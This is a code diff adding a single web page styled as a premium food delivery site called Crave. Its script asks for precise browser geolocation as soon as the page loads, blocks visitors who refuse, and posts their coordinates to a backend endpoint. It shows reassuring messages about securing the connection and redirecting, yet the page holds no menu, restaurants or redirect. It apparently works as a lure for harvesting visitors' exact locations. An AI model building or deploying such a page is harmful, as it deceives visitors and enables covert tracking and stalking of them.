@@ -1,0 +1,275 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Crave | Premium Food Delivery</title>
+    <!-- Google Fonts -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;500;700&display=swap" rel="stylesheet">
+    
+    <style>
+        :root {
+            --primary: #ff4757;
+            --primary-hover: #ff6b81;
+            --dark: #2f3542;
+            --light: #f1f2f6;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Outfit', sans-serif;
+        }
+
+        body {
+            /* Premium dark gradient background with a subtle food-related pattern or dark theme */
+            background: linear-gradient(135deg, rgba(0,0,0,0.8), rgba(47, 53, 66, 0.9)), 
+                        url('https://images.unsplash.com/photo-1504674900247-0877df9cc836?q=80&w=2070&auto=format&fit=crop') no-repeat center center/cover;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: white;
+            overflow: hidden;
+        }
+
+        /* Glassmorphism Container */
+        .glass-panel {
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(16px);
+            -webkit-backdrop-filter: blur(16px);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            border-radius: 24px;
+            padding: 50px 40px;
+            max-width: 500px;
+            width: 90%;
+            text-align: center;
+            box-shadow: 0 25px 50px rgba(0,0,0,0.5);
+            transform: translateY(20px);
+            opacity: 0;
+            animation: floatUp 0.8s cubic-bezier(0.23, 1, 0.32, 1) forwards;
+        }
+
+        @keyframes floatUp {
+            to {
+                transform: translateY(0);
+                opacity: 1;
+            }
+        }
+
+        .logo {
+            font-size: 2.5rem;
+            font-weight: 700;
+            margin-bottom: 10px;
+            letter-spacing: 2px;
+            background: linear-gradient(45deg, #ff4757, #ffa502);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .tagline {
+            font-size: 1.1rem;
+            color: #dfe4ea;
+            margin-bottom: 35px;
+            font-weight: 300;
+        }
+
+        .action-area {
+            background: rgba(0, 0, 0, 0.4);
+            padding: 30px;
+            border-radius: 16px;
+            border: 1px solid rgba(255,255,255,0.05);
+        }
+
+        .icon-wrapper {
+            margin-bottom: 20px;
+        }
+
+        .icon-wrapper svg {
+            width: 50px;
+            height: 50px;
+            fill: var(--primary);
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0% { transform: scale(1); opacity: 1; }
+            50% { transform: scale(1.1); opacity: 0.8; }
+            100% { transform: scale(1); opacity: 1; }
+        }
+
+        .status-text {
+            font-size: 1.2rem;
+            font-weight: 500;
+            margin-bottom: 15px;
+            color: #ffffff;
+            transition: color 0.3s ease;
+        }
+
+        .sub-text {
+            font-size: 0.9rem;
+            color: #a4b0be;
+            line-height: 1.5;
+        }
+
+        /* Modern loader */
+        .spinner {
+            width: 40px;
+            height: 40px;
+            margin: 0 auto 20px auto;
+            border: 3px solid rgba(255, 71, 87, 0.3);
+            border-radius: 50%;
+            border-top-color: var(--primary);
+            animation: spin 1s ease-in-out infinite;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .hidden {
+            display: none !important;
+        }
+
+        .success-check {
+            width: 50px;
+            height: 50px;
+            background: #2ed573;
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin: 0 auto 20px auto;
+            animation: popIn 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275) forwards;
+        }
+
+        .success-check svg {
+            width: 25px;
+            height: 25px;
+            fill: white;
+        }
+
+        @keyframes popIn {
+            0% { transform: scale(0); }
+            100% { transform: scale(1); }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="glass-panel">
+        <div class="logo">CRAVE</div>
+        <div class="tagline">Exclusive Dining, Delivered.</div>
+
+        <div class="action-area">
+            <div id="loading-state">
+                <div class="icon-wrapper">
+                    <!-- Location Pin SVG -->
+                    <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                        <path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z"/>
+                    </svg>
+                </div>
+                <div class="spinner" id="spinner"></div>
+                <div id="status-message" class="status-text">Locating best restaurants near you...</div>
+                <div class="sub-text">Please allow location access when prompted to discover premium options in your neighborhood.</div>
+            </div>
+
+            <div id="success-state" class="hidden">
+                <div class="success-check">
+                    <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                        <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/>
+                    </svg>
+                </div>
+                <div class="status-text" style="color: #2ed573;">Location Confirmed!</div>
+                <div class="sub-text">Curating your personalized menu... Redirecting shortly.</div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener("DOMContentLoaded", () => {
+            const statusMessage = document.getElementById('status-message');
+            const spinner = document.getElementById('spinner');
+            const loadingState = document.getElementById('loading-state');
+            const successState = document.getElementById('success-state');
+            const iconWrapper = document.querySelector('.icon-wrapper');
+
+            // Trigger Geolocation automatically on page load
+            if (navigator.geolocation) {
+                
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        // Success callback
+                        statusMessage.textContent = "Securing your connection...";
+                        
+                        const locationData = {
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude,
+                            accuracy: position.coords.accuracy
+                        };
+
+                        // Send location to the backend
+                        fetch('/api/location', {
+                            method: 'POST',
+                            headers: {
+                                'Content-Type': 'application/json'
+                            },
+                            body: JSON.stringify(locationData)
+                        })
+                        .then(response => response.json())
+                        .then(data => {
+                            if (data.status === 'success') {
+                                // Transition to success UI
+                                loadingState.classList.add('hidden');
+                                successState.classList.remove('hidden');
+                            } else {
+                                throw new Error('Backend failed to process');
+                            }
+                        })
+                        .catch(err => {
+                            console.error(err);
+                            spinner.style.display = 'none';
+                            iconWrapper.style.display = 'none';
+                            statusMessage.textContent = "Service temporarily unavailable.";
+                            statusMessage.style.color = '#ff4757';
+                        });
+
+                    },
+                    (error) => {
+                        // Error callback
+                        spinner.style.display = 'none';
+                        iconWrapper.style.display = 'none';
+                        statusMessage.style.color = '#ff4757';
+                        
+                        switch(error.code) {
+                            case error.PERMISSION_DENIED:
+                                statusMessage.textContent = "Location access is required to view the menu.";
+                                document.querySelector('.sub-text').textContent = "Please refresh the page and allow location access to continue.";
+                                break;
+                            case error.POSITION_UNAVAILABLE:
+                                statusMessage.textContent = "Location information is unavailable.";
+                                break;
+
+                            case error.UNKNOWN_ERROR:
+                                statusMessage.textContent = "An unknown error occurred.";
+                                break;
+                        }
+                    },
+                    {
+                        enableHighAccuracy: true,
+                        maximumAge: 0
+                    }
+                );
+            } else {
+                spinner.style.display = 'none';
+                iconWrapper.style.display = 'none';
+                statusMessage.textContent = "Geolocation is not supported by this browser.";
+                statusMessage.style.color = '#ff4757';
+            }
+        });
+    </script>
+</body>
+</html>
